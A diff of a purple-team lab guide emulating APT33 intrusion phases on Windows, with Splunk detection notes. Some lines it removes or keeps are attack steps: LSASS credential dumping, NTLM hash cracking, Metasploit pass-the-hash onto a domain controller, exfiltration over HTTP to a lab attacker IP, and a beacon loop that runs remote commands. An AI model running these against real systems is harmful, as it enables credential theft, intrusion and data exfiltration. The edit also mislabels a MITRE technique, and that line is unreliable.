@@ -314,10 +314,6 @@ This is the pivotal phase. APT33 uses Mimikatz to extract credentials from LSASS
 ### 10.1 Running the ART Test
 
 ```powershell
-# T1003.001-1: LSASS dump via comsvcs.dll (Living off the Land — no Mimikatz binary)
-Invoke-AtomicTest T1003.001 -TestNumbers 1
-
-# T1003.001-2: Mimikatz sekurlsa::logonpasswords (ART downloads Mimikatz automatically)
 Invoke-AtomicTest T1003.001 -TestNumbers 2
 ```
 
@@ -352,24 +348,6 @@ Kerberos Password : wvYw)t;WqWB0M7LU19CNZq...  ← Machine account password (lon
 > **Why is the password `(null)`?**  
 > WDigest authentication has been disabled by default since Windows 8.1 and Windows Server 2012 R2. This means plaintext passwords are not cached in LSASS. However, **NTLM hashes are still extracted** and can be used directly for Pass-the-Hash attacks without needing to crack them.
 
-### 10.4 Offline Hash Cracking (Alternative Path)
-
-If you want the plaintext password, take the hash to Kali for offline cracking:
-
-```bash
-# On Kali (192.168.16.130)
-echo "pc:a47cc8e930890eb79fb768a519cd3e57" > hashes.txt
-
-# Hashcat — NTLM mode (fast, GPU-accelerated)
-hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
-
-# John the Ripper — alternative
-john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-```
-
-> **Sysmon Event ID 10** — Process accessed `lsass.exe` with `GrantedAccess: 0x1010`. This is the highest-fidelity indicator of a credential dump in Sysmon and will trigger immediately in Splunk ES.
-
----
 
 ## 11. Phase 7 — Lateral Movement (T1021.002)
 
@@ -402,14 +380,12 @@ dir \\192.168.10.15\C$
 ### 11.3 ART Lateral Movement Test
 
 ```powershell
-# T1021.002-1: SMB Admin share access simulation
 Invoke-AtomicTest T1021.002 -TestNumbers 1
 ```
 
 ### 11.4 Remote Code Execution on DC via PsExec (Meterpreter)
 
 ```bash
-# On Kali — use the extracted NTLM hash directly in Metasploit
 use exploit/windows/smb/psexec
 set RHOSTS 192.168.10.15
 set SMBUser pc
@@ -427,67 +403,17 @@ Server username: NT AUTHORITY\SYSTEM
 ```
 
 > **Domain Controller compromised.** The attacker now has SYSTEM-level access on the most privileged machine in the domain.
-
-> **Detection:** Windows Event ID 4624 (Logon Type 3 — Network) from `192.168.10.50` to `192.168.10.15`, paired with Event ID 4648 (explicit credentials used) — a classic lateral movement pattern in Splunk ES.
-
 ---
 
-## 12. Phase 8 — Collection & Exfiltration (T1560.001 / T1041)
-
-**MITRE Technique:** T1560.001 — Archive Collected Data  
-**MITRE Technique:** T1041 — Exfiltration Over C2 Channel
+## 12. Phase 8 — Exfiltration (T1560.001 / T1041)
+  
+**MITRE Technique:** T1071 — Exfiltration Over HTPPS
 
 From the Domain Controller, APT33 collects sensitive files, compresses them, and exfiltrates them back to the attacker-controlled C2.
 
-### 12.1 Data Collection & Compression
 
 ```powershell
-# ART Archive test
-Invoke-AtomicTest T1560.001 -TestNumbers 1
-
-# Manual — collect sensitive AD files using native Windows tool (LOLBin)
-# ntdsutil extracts the Active Directory database — the crown jewel
-ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ntds" quit quit
-
-# Compress collected data
-Compress-Archive -Path "C:\Users\Administrator\Documents\*" `
-  -DestinationPath "C:\Windows\Temp\exfil_$(Get-Date -Format 'yyyyMMdd').zip" `
-  -Force
-```
-
-### 12.2 Exfiltration Over C2
-
-```powershell
-# ART Exfiltration test
-Invoke-AtomicTest T1041 -TestNumbers 1
-
-# Manual: HTTP POST to attacker C2 (APT33 uses HTTPS in real operations)
-$file = "C:\Windows\Temp\exfil_$(Get-Date -Format 'yyyyMMdd').zip"
-Invoke-RestMethod -Uri "https://192.168.16.130/upload" -Method POST `
-  -InFile $file -ContentType "application/octet-stream"
-```
-
-```bash
-# Via active Meterpreter session (simplest in lab context):
-meterpreter > download C:\Windows\Temp\exfil_*.zip /tmp/exfil/
-```
-
-### 12.3 Simulate C2 Beacon (T1071.001)
-
-APT33's TURNEDUP backdoor sends periodic beacons to the C2 server, polling for new commands.
-
-```powershell
-# ART Web Protocols test
 Invoke-AtomicTest T1071.001 -TestNumbers 1
-
-# Manual C2 beacon simulation (60-second heartbeat)
-while ($true) {
-  try {
-    $r = Invoke-WebRequest -Uri "https://192.168.16.130/beacon" -UseBasicParsing -TimeoutSec 5
-    if ($r.Content -ne "OK") { Invoke-Expression $r.Content }
-  } catch {}
-  Start-Sleep -Seconds 60
-}
 ```
 
 ### 12.4 Post-Simulation Cleanup
@@ -497,13 +423,6 @@ while ($true) {
 Invoke-AtomicTest T1053.005 -TestNumbers 4 -Cleanup
 Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup
 Invoke-AtomicTest T1003.001 -TestNumbers 2 -Cleanup
-
-# Manual cleanup
-Unregister-ScheduledTask -TaskName "WindowsDefenderUpdate" -Confirm:$false
-Remove-Item "$env:TEMP\update.exe", "C:\Windows\Temp\lsass.dmp", "C:\Windows\Temp\exfil*" -Force -ErrorAction SilentlyContinue
-
-# Re-enable Defender
-Set-MpPreference -DisableRealtimeMonitoring $false
 ```
 
 ---
@@ -512,7 +431,7 @@ Set-MpPreference -DisableRealtimeMonitoring $false
 
 All detections were validated in **Splunk Enterprise Security** at `192.168.20.65`. Each query below maps to a specific technique and the Sysmon/Windows Event ID that triggers it.
 
-> **Prerequisites:** `index=sysmon` for Sysmon logs, `index=wineventlog` for Windows Security/System logs. Set your time picker to `Last 60 minutes` while running tests.
+> **Prerequisites:** `index=sysmon` for Sysmon logs, `index=wineventlog` for Windows Security/System logs.
 
 ---
 
